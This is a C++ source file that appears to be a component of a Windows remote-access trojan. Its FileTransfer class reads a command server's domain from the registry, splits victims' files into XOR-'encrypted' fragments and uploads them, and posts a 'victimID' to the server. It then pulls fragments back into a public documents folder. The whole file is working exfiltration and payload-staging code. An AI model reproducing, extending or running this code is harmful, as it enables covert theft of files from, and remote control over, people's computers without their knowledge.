#include <Windows.h>
#include <iostream>
#include <curl/curl.h>


using namespace std;

class FileTransfer {
public:

    IPC ipc = IPC();
    
    wstring SERVER_BASE_URL_FINAL = ipc.readDomainFromRegistry();

    void encryptFileWithXOR(char* fileName) {
        FILE* file = fopen(fileName, "rb+");
        if (file == NULL) {
            exit(EXIT_FAILURE);
        }

        fseek(file, 0, SEEK_END);
        long fileSize = ftell(file);
        fseek(file, 0, SEEK_SET);

        char* buffer = (char*)malloc(fileSize);
        if (buffer == NULL) {
            fclose(file);
            exit(EXIT_FAILURE);
        }
        fread(buffer, 1, fileSize, file);

        char xorKey = 'S';

        for (long i = 0; i < fileSize; ++i) {
            buffer[i] ^= xorKey;
        }

        fseek(file, 0, SEEK_SET);
        fwrite(buffer, 1, fileSize, file);
        free(buffer);
        fclose(file);
    }

    int fileDownload(char* fileName, char* serverUrl) {
        splitFile(fileName, 3);

        for (int i = 1; i <= 3; ++i) {
            char fragmentFileName[256];
            sprintf(fragmentFileName, "%s.part%d", fileName, i);

            encryptFileWithXOR(fragmentFileName);

            int sendResult = sendFragment(fragmentFileName, serverUrl);

            if (sendResult != 0) {
                fprintf(stderr, "Error al enviar el fragmento %d\n", i);
                return sendResult;
            }

            remove(fragmentFileName); 
        }

        return 0;
    }


    void splitFile(const char* fileName, int numChunks) {
        FILE* file = fopen(fileName, "rb");
        if (file == NULL) {
            perror("Error al abrir el archivo");
            exit(EXIT_FAILURE);
        }

        fseek(file, 0, SEEK_END);
        long fileSize = ftell(file);
        rewind(file);

        int chunkSize = fileSize / numChunks;
        char buffer[1024];

        for (int i = 0; i < numChunks; ++i) {
            sprintf(buffer, "%s.part%d", fileName, i + 1);
            FILE* chunk = fopen(buffer, "wb");
            if (chunk == NULL) {
                perror("Error al crear el fragmento");
                exit(EXIT_FAILURE);
            }

            int bytesRead = fread(buffer, 1, chunkSize, file);
            fwrite(buffer, 1, bytesRead, chunk);

            fclose(chunk);
        }

        fclose(file);
    }


    int sendFragment(char* fragmentFileName, char* serverUrl) {
        CURL* curl;
        CURLcode res;

        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();

        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, serverUrl);
            curl_easy_setopt(curl, CURLOPT_POST, 1L);

            struct curl_httppost* formpost = NULL;
            struct curl_httppost* lastptr = NULL;

            curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "file", CURLFORM_FILE, fragmentFileName, CURLFORM_END);
            curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

            res = curl_easy_perform(curl);

            if (res != CURLE_OK)
                fprintf(stderr, "Error en la solicitud: %s\n", curl_easy_strerror(res));

            curl_easy_cleanup(curl);
            curl_formfree(formpost);
        }

        return res;
    }

    string fileUpload(string outputID, char* serverUrl) {
        httpRequest http = httpRequest();
        string XappTimestamp = http.createTimeStamp();
        string XAppSignature = http.createSignature("/Action/SecretOperation");
        

        // XAppSignature
        CURL* curl;
        CURLcode res;
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
        //outputID = secretOperation(outputID);
        wstring url = SERVER_BASE_URL_FINAL + L"/File/Send";
        string urlStr(url.begin(), url.end());

        if (curl) {
            //curl_easy_setopt(curl, CURLOPT_URL, SERVER_BASE_URL "/File/Send");
            curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
            curl_easy_setopt(curl, CURLOPT_POST, 1L);

            struct curl_slist* headers = NULL;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

            headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
            headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            const char* id_cstr = outputID.c_str();
            const char* action_cstr = "16";

            char post_data[256];
            snprintf(post_data, sizeof(post_data), "{\"victimID\":\"%s\",\"actionID\":\"%s\"}", id_cstr, action_cstr);

            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            string response_data;
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http.WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
            res = curl_easy_perform(curl);
            curl_global_cleanup();
            curl_easy_cleanup(curl);
            // response_data = "5,6,7,"
            downloadAndDecryptFragments(response_data);
            return response_data;
        }
		return 0;
	}

    int downloadAndDecryptFragments(string response_data) {
        string fragments[3];
        int i = 0;
		for (int j = 0; j < response_data.length(); j++) {
			if (response_data[j] == ',') {
				i++;
			}   
			else {
				fragments[i] += response_data[j];
			}
		}
        for (int i = 0; i < 3; i++) {
			httpRequest http = httpRequest();
			string XappTimestamp = http.createTimeStamp();
			string XAppSignature = http.createSignature("/Action/SecretOperation");

			CURL* curl;
			CURLcode res;
			curl_global_init(CURL_GLOBAL_DEFAULT);
			curl = curl_easy_init();
            wstring url = SERVER_BASE_URL_FINAL + L"/File/Read";
            string urlStr(url.begin(), url.end());

			if (curl) {
				//curl_easy_setopt(curl, CURLOPT_URL, SERVER_BASE_URL "/File/Read");
                curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());    
                curl_easy_setopt(curl, CURLOPT_POST, 1L);

				struct curl_slist* headers = NULL;
				headers = curl_slist_append(headers, "Content-Type: application/json");
				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
				curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

				headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
				headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

				const char* id_cstr = fragments[i].c_str();

				char post_data[256];
				snprintf(post_data, sizeof(post_data), "{\"id\":\"%s\"}", id_cstr);

				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
				string response_data;
				curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http.WriteCallback);
				curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
				res = curl_easy_perform(curl);
				curl_global_cleanup();
				curl_easy_cleanup(curl);
                // store in file
                FILE* file = fopen("C:\\Users\\Public\\Documents\\downloadedFile.txt", "ab");
                if (file == NULL) {
					perror("Error al abrir el archivo");
					exit(EXIT_FAILURE);
				}
				fwrite(response_data.c_str(), 1, response_data.length(), file);
                fclose(file);
			}
		}
        char fileName[] = "C:\\Users\\Public\\Documents\\downloadedFile.txt";
        encryptFileWithXOR(fileName);
		return 0;
	}

    static string secretOperation(string data) {
        int dataInt = stoi(data);
        return to_string(dataInt * 12);
    }

};